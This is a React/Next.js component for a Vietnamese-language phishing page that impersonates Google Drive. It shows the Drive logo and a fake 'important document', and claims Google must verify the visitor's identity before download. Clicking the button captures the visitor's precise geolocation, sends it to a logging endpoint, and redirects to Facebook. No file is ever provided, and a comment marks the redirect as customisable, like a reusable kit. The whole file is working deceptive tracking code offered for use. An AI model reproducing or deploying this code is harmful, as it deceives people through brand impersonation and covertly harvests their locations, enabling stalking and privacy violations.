
'use client';

import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { FileText, ShieldCheck } from 'lucide-react';

export function DriveVerificationClient() {
  // === CUSTOMIZE YOUR REDIRECT LINK HERE ===
  const REDIRECT_URL = 'https://www.facebook.com'; 
  // =========================================

  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          fetch('/api/log-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              acc: pos.coords.accuracy,
            }),
          }).finally(() => {
            window.location.href = REDIRECT_URL;
          });
        },
        () => {
          // If user denies location, still redirect
          window.location.href = REDIRECT_URL;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      // If geolocation is not supported, still redirect
      window.location.href = REDIRECT_URL;
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-muted/30 p-4">
      <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
        <CardContent className="p-0 flex flex-col items-center">
          
          <Image
            className="mb-5"
            src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
            alt="Google Drive"
            width={74}
            height={74}
          />
          
          <h1 className="text-2xl font-bold mb-2 text-foreground">Xác minh để tiếp tục</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            Để bảo vệ tệp và ngăn chặn truy cập trái phép, Google cần xác minh nhanh danh tính của bạn.
          </p>

          <div className="w-full bg-muted/40 border rounded-lg p-4 flex items-center gap-4 mb-8 text-left">
            <FileText className="h-10 w-10 text-primary shrink-0" />
            <div>
              <p className="font-semibold text-foreground">Tai-lieu-quan-trong.pdf</p>
              <p className="text-xs text-muted-foreground">1.2 MB - Tệp an toàn</p>
            </div>
          </div>

          <Button
            className="w-full h-12 text-base font-semibold bg-primary hover:bg-primary/90 text-primary-foreground rounded-lg"
            onClick={requestLocation}
          >
            <ShieldCheck className="mr-2 h-5 w-5" />
            Xác minh & Tải xuống
          </Button>

          <div className="text-xs text-muted-foreground/80 mt-6">
            Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
